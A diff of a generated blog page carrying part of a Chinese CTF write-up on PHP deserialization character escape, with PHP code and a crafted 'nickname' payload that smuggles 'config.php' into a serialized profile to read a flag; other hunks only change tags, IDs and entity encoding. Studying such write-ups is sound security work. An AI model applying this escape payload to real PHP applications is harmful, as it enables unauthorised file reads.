@@ -126,7 +126,7 @@
 <p>可以看到update中只有nickename 可以用数组绕过</p>
 <p>序列化完成后进入 profile.php 页面</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$profile[&#x27;phone&#x27;]=&#x27;12345678901&#x27;;</span><br><span class="line">$profile[&#x27;email&#x27;]=&#x27;123@123.com&#x27;;</span><br><span class="line">$profile[&#x27;nickname&#x27;]=[&#x27;a&#x27;];</span><br><span class="line">$profile[&#x27;photo&#x27;]=&#x27;config.com&#x27;;</span><br><span class="line">echo serialize($profile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>a:4:{s:5:”phone”;s:11:”12345678901”;s:5:”email”;s:11:”<a href="mailto:&#49;&#50;&#x33;&#x40;&#49;&#x32;&#51;&#x2e;&#x63;&#x6f;&#109;">&#49;&#50;&#x33;&#x40;&#49;&#x32;&#51;&#x2e;&#x63;&#x6f;&#109;</a>“;s:8:”nickname”;a:1:{i:0;s:8:””nickname;}s:5:”photo”;s:10:”config.com”;}<br>需要逃逸 “;}s:5:”photo”;s:10:”config.com”;} 共34 位<br>因此构造nickname=<br>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}<br>profile页面中会先在class.php中会将where替换成hacker<br>再反序列化profile  多出34位 使最后34位逃逸到下一 photo </p>
+<p>a:4:{s:5:”phone”;s:11:”12345678901”;s:5:”email”;s:11:”<a href="mailto:&#x31;&#50;&#x33;&#x40;&#49;&#x32;&#x33;&#x2e;&#x63;&#x6f;&#x6d;">&#x31;&#50;&#x33;&#x40;&#49;&#x32;&#x33;&#x2e;&#x63;&#x6f;&#x6d;</a>“;s:8:”nickname”;a:1:{i:0;s:8:””nickname;}s:5:”photo”;s:10:”config.com”;}<br>需要逃逸 “;}s:5:”photo”;s:10:”config.com”;} 共34 位<br>因此构造nickname=<br>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}<br>profile页面中会先在class.php中会将where替换成hacker<br>再反序列化profile  多出34位 使最后34位逃逸到下一 photo </p>
 <p>注意需要抓包修改 nickname 为 nickname[]</p>
 <p>得到base 64 编码后的flag</p>
 <p>总结：<br>  1.为什么要字符逃逸 只能间接控制到某一个变量<br>  2.如何字符逃逸 运动filter函数的替换</p>
@@ -150,7 +150,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/26/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="ckw38fgdb0000e0uxcoij3bly" data-title="php反序列化总结" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/08/26/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="ckw38rvbe0005a0ux3i5z56a8" data-title="php反序列化总结" class="article-share-link">Share</a>
       
       
       
@@ -201,7 +201,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xml/" rel="tag">xml</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">phar反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xml/" rel="tag">xml</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
     </div>
   </div>
 
@@ -211,7 +211,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/xml/" style="font-size: 10px;">xml</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 20px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a>
+      <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">phar反序列化</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/xml/" style="font-size: 10px;">xml</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a>
     </div>
   </div>
 
@@ -233,7 +233,7 @@
       <ul>
         
           <li>
-            <a href="/2021/11/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20-%20%E5%89%AF%E6%9C%AC/">文件上传漏洞总结</a>
+            <a href="/2021/11/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">phar反序列化总结</a>
           </li>
         
           <li>
